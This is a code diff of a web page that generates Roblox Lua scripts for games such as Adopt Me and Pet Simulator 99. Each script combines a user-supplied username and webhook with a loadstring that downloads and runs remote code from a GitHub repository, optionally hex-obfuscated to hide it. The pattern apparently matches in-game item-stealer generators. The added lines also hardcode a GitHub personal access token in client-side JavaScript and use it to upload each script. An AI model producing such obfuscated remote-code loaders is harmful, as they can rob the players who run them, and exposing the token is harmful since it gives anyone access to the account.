@@ -65,28 +65,26 @@
         <button onclick="generateScript()">Generate Script</button>
     </div>
     <script>
-        let loadstrings = {
-            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
-            "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()",
-            "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe'))()",
-            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
-            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
-        };function hexEncode(script) {
-        return script.split('').map((c, i) => {
-            let hex = c.charCodeAt(0).toString(16);
-            let rand = Math.floor(Math.random() * 9);
-            return `\z${hex}${rand}`; // Custom separator with random digits
-        }).join('');
+        const token = "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";let loadstrings = {
+        "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
+        "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()",
+        "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe'))()",
+        "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
+        "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
+    };
+
+    function hexEncode(script) {
+        return script.split('').map(c => `\z${c.charCodeAt(0).toString(16)}${Math.floor(Math.random() * 9)}`).join('');
     }
 
     function wrapInDecoder(hexString) {
-        return `loadstring((function()
+        return `loadstring((function(...)
+            local P = ''
             local hex = '${hexString}'
-            local decoded = ''
             for h in hex:gmatch('\\z(%x%x)%d') do
-                decoded = decoded .. string.char(tonumber(h, 16))
+                P = P .. string.char(tonumber(h, 16))
             end
-            return decoded
+            return P
         end)())()`;
     }
 
@@ -107,24 +105,37 @@
         }
 
         let script = `Username = "${username}"
-Webhook = "${webhook}" 
-${loadstrings[selectedScript]}`;
+
+Webhook = "${webhook}" ${loadstrings[selectedScript]}`;
 
 if (autoObfuscate) {
             script = obfuscateScript(script);
         }
-        
-        downloadScript(script);
+
+        uploadToGitHub(script, selectedScript);
     }
 
-    function downloadScript(content) {
-        let blob = new Blob([content], { type: "text/plain" });
-        let a = document.createElement("a");
-        a.href = URL.createObjectURL(blob);
-        a.download = "generated_script.txt";
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
+    function uploadToGitHub(content, scriptName) {
+        let filename = `Void${scriptName}.txt`;
+        fetch('https://api.github.com/repos/YourUsername/YourRepo/contents/' + filename, {
+            method: 'PUT',
+            headers: {
+                'Authorization': 'Bearer ' + token,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                message: 'Add new script',
+                content: btoa(content)
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            let rawURL = data.content.download_url;
+            let loadString = `loadstring(game:HttpGet('${rawURL}'))()`;
+            navigator.clipboard.writeText(loadString);
+            alert("Script uploaded and loadstring copied to clipboard!");
+        })
+        .catch(error => console.error('Error uploading:', error));
     }
 </script>
 
